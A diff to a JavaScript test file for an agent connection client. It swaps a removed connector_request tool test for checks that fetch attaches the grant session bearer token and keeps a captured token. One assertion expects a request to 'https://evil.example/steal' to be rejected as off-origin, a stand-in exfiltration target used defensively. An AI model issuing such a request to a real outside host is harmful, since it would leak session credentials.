@@ -6,7 +6,6 @@ import {
   createGrantModelWebSocket,
   decimalAtomics,
 } from "../cloud/actions/agent.mjs";
-import { connectorRequestTools } from "../cloud/connectors.mjs";
 
 test("MPP channel ceilings preserve the signed six-decimal daily limit", () => {
   assert.equal(decimalAtomics(10_000_000n, 6), "10");
@@ -44,6 +43,7 @@ test("the default model uses a one-time grant ticket for the connected ChatGPT a
 
 test("Connect binds normalized cloud accounts into auth resources and the connection request", async () => {
   const requests = [];
+  const fetches = [];
   const walletRequests = [];
   const expiry = Math.floor(Date.now() / 1_000) + 3_600;
   const keyId = "0x1111111111111111111111111111111111111111";
@@ -79,6 +79,11 @@ test("Connect binds normalized cloud accounts into auth resources and the connec
       setup() {
         return {
           baseUrl: "https://connect.example",
+          async fetch(input, init) {
+            const request = new Request(input, init);
+            fetches.push(request);
+            return Response.json({ ok: true });
+          },
           async request(request) {
             requests.push(request);
             return testConnectionWire({ expiry, keyId, capabilities: [
@@ -138,60 +143,18 @@ test("Connect binds normalized cloud accounts into auth resources and the connec
   assert.deepEqual(connection.grant.connectors, ["github", "gdrive"]);
   assert.equal("credentials" in connection.grant, false);
   assert.equal("account" in connection.grant, false);
-});
 
-test("connector_request is grant-scoped, abortable, accounted, and absent for ChatGPT-only grants", async () => {
-  const requests = [];
-  const calls = new Set();
-  const controller = new AbortController();
-  const connection = {
-    grant: {
-      id: `0x${"44".repeat(32)}`,
-      connectors: Object.freeze(["github", "gmail"]),
-    },
-  };
-  const tools = connectorRequestTools({
-    async request(request) {
-      requests.push(request);
-      return { status: 200, headers: { "content-type": "application/json" }, body: "{\"login\":\"octocat\"}" };
-    },
-  }, connection, calls);
-
-  assert.deepEqual(tools.connector_request.parameters.properties.provider.enum, ["github", "gmail"]);
-  const result = await tools.connector_request.handler({
-    provider: "github",
-    path: "/user",
-    method: "GET",
-    headers: { accept: "application/vnd.github+json" },
-  }, { signal: controller.signal });
-  assert.deepEqual(requests, [{
-    method: "POST",
-    path: `/v1/grants/${connection.grant.id}/connectors/github/request`,
-    body: {
-      path: "/user",
-      method: "GET",
-      headers: { accept: "application/vnd.github+json" },
-    },
-    signal: controller.signal,
-  }]);
-  assert.deepEqual(result, {
-    status: 200,
-    headers: { "content-type": "application/json" },
-    body: "{\"login\":\"octocat\"}",
-  });
-  assert.deepEqual([...calls], ["connector_request"]);
-
+  await client.fetch("/v1/agent/account-info", { headers: { accept: "application/json" } });
+  assert.equal(fetches[0].url, "https://connect.example/v1/agent/account-info");
+  assert.equal(fetches[0].headers.get("authorization"), "Bearer grant-session-test");
+  const captured = client._captureSession();
+  client._setSessionToken("replacement-grant-session");
+  await captured.fetch("/v1/egress");
+  assert.equal(fetches[1].headers.get("authorization"), "Bearer grant-session-test");
+  assert.equal(fetches[1].headers.get("authorization")?.includes("replacement"), false);
   await assert.rejects(
-    tools.connector_request.handler({ provider: "gdrive", path: "/files" }, { signal: controller.signal }),
-    /provider is not present in the active grant/,
-  );
-  await assert.rejects(
-    tools.connector_request.handler({ provider: "github", path: "/user", body: { leaked: true } }, { signal: controller.signal }),
-    /body must be a string/,
-  );
-  assert.deepEqual(
-    connectorRequestTools({ request() {} }, { grant: { connectors: ["chatgpt"] } }, new Set()),
-    {},
+    Promise.resolve().then(() => client.fetch("https://evil.example/steal")),
+    /restricted to its configured API origin/,
   );
 });
 
